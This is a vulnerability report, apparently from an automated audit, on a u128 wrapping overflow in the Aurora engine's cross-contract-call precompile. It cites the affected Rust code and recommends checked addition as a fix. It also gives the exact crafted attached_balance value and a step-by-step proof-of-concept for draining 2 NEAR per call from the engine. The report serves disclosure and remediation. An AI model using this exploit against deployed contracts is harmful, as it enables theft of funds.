The vulnerability is real. Let me confirm the exact `total_near()` path for a simple `PromiseArgs::Create` to ensure the attacker can set `attached_balance` directly to the overflow value without any saturation guard.

### Title
Yocto Addition Overflow in XCC Precompile Allows Draining Engine NEAR Balance — (`engine-precompiles/src/xcc.rs`, `engine-types/src/types/balance.rs`)

---

### Summary

`Yocto::Add` uses a plain, unchecked `u128` addition that wraps silently in release mode. An attacker who sets `attached_balance` in a `PromiseCreateArgs` to exactly `u128::MAX - STORAGE_AMOUNT + 1` causes `required_near` to wrap to zero inside `run_with_handle`. The wNEAR `transferFrom` is then skipped entirely, yet `handle_precompile_promise` still issues a `PromiseAction::Transfer { amount: STORAGE_AMOUNT }` from the engine's own NEAR balance to create the router — and the `send_refund` callback that would return those funds is never scheduled because it lives inside the `required_near != ZERO_YOCTO` branch. The engine loses 2 NEAR per invocation with no user compensation.

---

### Finding Description

**Root cause — wrapping addition:**

`Yocto::Add` is implemented as:

```rust
fn add(self, rhs: Self) -> Self::Output {
    Self(self.0 + rhs.0)   // plain u128 +, wraps in release mode
}
``` [1](#0-0) 

**Attacker-controlled input path:**

For `CrossContractCallArgs::Eager(PromiseArgs::Create(call))`, `total_near()` returns `call.attached_balance` verbatim — no saturation guard:

```rust
Self::Create(call) => call.attached_balance,
``` [2](#0-1) 

The attacker sets `attached_balance = u128::MAX - STORAGE_AMOUNT.as_u128() + 1` in the Borsh-encoded `PromiseCreateArgs`.

**Overflow site:**

```rust
None => attached_near + state::STORAGE_AMOUNT,
``` [3](#0-2) 

`STORAGE_AMOUNT = Yocto::new(2_000_000_000_000_000_000_000_000)` (2 NEAR). [4](#0-3) 

With the crafted value: `(u128::MAX - 2e24 + 1) + 2e24 = u128::MAX + 1 = 0` (wrapping). `required_near` becomes `ZERO_YOCTO`.

**wNEAR transfer skipped:**

```rust
if required_near != ZERO_YOCTO {
    // transferFrom — skipped entirely
}
``` [5](#0-4) 

The log is emitted with `required_near = 0`.

**Engine still funds router creation:**

In `handle_precompile_promise`, the engine independently re-checks `get_code_version_of_address`. Since no router exists, `create_needed = true`, and the engine unconditionally issues:

```rust
promise_actions.push(PromiseAction::Transfer {
    amount: STORAGE_AMOUNT,
});
``` [6](#0-5) 

**Refund never scheduled:**

The `send_refund` callback (which returns `STORAGE_AMOUNT` to the engine) is only attached inside the `else` branch — i.e., only when `required_near != ZERO_YOCTO`:

```rust
let withdraw_id = if required_near == ZERO_YOCTO {
    setup_id   // ← taken; no withdraw, no refund
} else {
    // ... withdraw_wnear_to_router ...
    if refund_needed {
        // send_refund attached here — never reached
    }
};
``` [7](#0-6) 

The engine transfers 2 NEAR to create the router and never recovers it.

---

### Impact Explanation

Each invocation drains exactly `STORAGE_AMOUNT` (2 NEAR) from the engine's NEAR balance. The attacker can repeat this with fresh EVM addresses (each has no router deployed, so `create_needed` is always `true`). There is no per-address rate limit. This is direct, at-rest theft of engine-controlled NEAR funds — **Critical**.

---

### Likelihood Explanation

The exploit requires only:
1. The ability to submit an EVM transaction to Aurora (public, permissionless).
2. Borsh-encoding a `CrossContractCallArgs::Eager(PromiseArgs::Create(...))` with `attached_balance = u128::MAX - 2_000_000_000_000_000_000_000_000 + 1`.
3. No wNEAR balance or approval is needed — the transfer is skipped.

No admin access, no leaked keys, no oracle dependency. Fully reachable from the public EVM interface.

---

### Recommendation

Replace the plain `+` in `Yocto::Add` with a checked or saturating addition, and add an explicit overflow guard at the addition site in `run_with_handle`:

```rust
// In balance.rs
fn add(self, rhs: Self) -> Self::Output {
    Self(self.0.checked_add(rhs.0).expect("Yocto overflow"))
}
```

Or, at the call site in `xcc.rs`:

```rust
None => attached_near
    .as_u128()
    .checked_add(state::STORAGE_AMOUNT.as_u128())
    .map(Yocto::new)
    .ok_or_else(|| revert_with_message("ERR_XCC_NEAR_OVERFLOW"))?,
```

Additionally, add an invariant assertion in `handle_precompile_promise` that `required_near >= STORAGE_AMOUNT` whenever `create_needed` is true.

---

### Proof of Concept

```rust
// Arithmetic proof
let storage: u128 = 2_000_000_000_000_000_000_000_000; // STORAGE_AMOUNT
let attached: u128 = u128::MAX - storage + 1;
let required = attached.wrapping_add(storage); // = 0
assert_eq!(required, 0); // required_near wraps to ZERO_YOCTO

// Exploit call sequence:
// 1. Attacker constructs:
let malicious_promise = PromiseCreateArgs {
    target_account_id: "any.near".parse().unwrap(),
    method: "any".into(),
    args: vec![],
    attached_balance: Yocto::new(u128::MAX - 2_000_000_000_000_000_000_000_000 + 1),
    attached_gas: NearGas::new(5_000_000_000_000),
};
let xcc_args = CrossContractCallArgs::Eager(PromiseArgs::Create(malicious_promise));
// 2. Attacker submits EVM tx to cross_contract_call::ADDRESS with borsh::to_vec(&xcc_args)
// 3. run_with_handle: required_near = 0 → wNEAR transfer skipped
// 4. handle_precompile_promise: engine transfers STORAGE_AMOUNT (2 NEAR) to new router
// 5. send_refund never scheduled → engine loses 2 NEAR
// 6. Repeat with a new EVM address → drain engine indefinitely
```

### Citations

**File:** engine-types/src/types/balance.rs (L130-132)
```rust
    fn add(self, rhs: Self) -> Self::Output {
        Self(self.0 + rhs.0)
    }
```

**File:** engine-types/src/parameters/promise.rs (L40-42)
```rust
    pub fn total_near(&self) -> Yocto {
        match self {
            Self::Create(call) => call.attached_balance,
```

**File:** engine-precompiles/src/xcc.rs (L177-182)
```rust
        let required_near =
            match state::get_code_version_of_address(&self.io, &Address::new(sender)) {
                // If there is no deployed version of the router contract then we need to charge for storage staking
                None => attached_near + state::STORAGE_AMOUNT,
                Some(_) => attached_near,
            };
```

**File:** engine-precompiles/src/xcc.rs (L184-217)
```rust
        if required_near != ZERO_YOCTO {
            let engine_implicit_address = aurora_engine_sdk::types::near_account_to_evm_address(
                self.engine_account_id.as_bytes(),
            );
            let tx_data = transfer_from_args(
                sender.0.into(),
                engine_implicit_address.raw().0.into(),
                required_near.as_u128().into(),
            );
            let wnear_address = state::get_wnear_address(&self.io);
            let context = aurora_evm::Context {
                address: wnear_address.raw(),
                caller: cross_contract_call::ADDRESS.raw(),
                apparent_value: U256::zero(),
            };
            let (exit_reason, return_value) =
                handle.call(wnear_address.raw(), None, tx_data, None, false, &context);
            match exit_reason {
                // Transfer successful, nothing to do
                aurora_evm::ExitReason::Succeed(_) => (),
                aurora_evm::ExitReason::Revert(r) => {
                    return Err(PrecompileFailure::Revert {
                        exit_status: r,
                        output: return_value,
                    });
                }
                aurora_evm::ExitReason::Error(e) => {
                    return Err(PrecompileFailure::Error { exit_status: e });
                }
                aurora_evm::ExitReason::Fatal(f) => {
                    return Err(PrecompileFailure::Fatal { exit_status: f });
                }
            }
        }
```

**File:** engine-precompiles/src/xcc.rs (L255-255)
```rust
    pub const STORAGE_AMOUNT: Yocto = Yocto::new(2_000_000_000_000_000_000_000_000);
```

**File:** engine/src/xcc.rs (L226-230)
```rust
            if *create_needed {
                promise_actions.push(PromiseAction::CreateAccount);
                promise_actions.push(PromiseAction::Transfer {
                    amount: STORAGE_AMOUNT,
                });
```

**File:** engine/src/xcc.rs (L289-330)
```rust
    let withdraw_id = if required_near == ZERO_YOCTO {
        setup_id
    } else {
        let withdraw_call_args = WithdrawWnearToRouterArgs {
            target: sender,
            amount: required_near,
        };
        let withdraw_call = PromiseCreateArgs {
            target_account_id: current_account_id.clone(),
            method: "withdraw_wnear_to_router".into(),
            args: borsh::to_vec(&withdraw_call_args).unwrap(),
            attached_balance: ZERO_YOCTO,
            attached_gas: WITHDRAW_GAS,
        };
        // Safety: This promise is safe. Even though this is a call from the engine account to
        // itself invoking the `call` method (which could be dangerous), the argument to `call`
        // is controlled entirely by us (not any user). This call will only execute the wnear
        // exit precompile, and only for the necessary amount. Note that this amount will always
        // be present, otherwise the user's call to the xcc precompile would have failed.
        let id = match setup_id {
            None => handler.promise_create_call(&withdraw_call),
            Some(setup_id) => handler.promise_attach_callback(setup_id, &withdraw_call),
        };
        let refund_needed = match deploy_needed {
            AddressVersionStatus::DeployNeeded { create_needed } => create_needed,
            AddressVersionStatus::UpToDate => false,
        };
        if refund_needed {
            let refund_call = PromiseCreateArgs {
                target_account_id: promise.target_account_id.clone(),
                method: "send_refund".into(),
                args: Vec::new(),
                attached_balance: ZERO_YOCTO,
                attached_gas: REFUND_GAS,
            };
            // Safety: This call is safe because the router's `send_refund` method
            // does not violate any security invariants. It only sends NEAR back to this contract.
            Some(handler.promise_attach_callback(id, &refund_call))
        } else {
            Some(id)
        }
    };
```
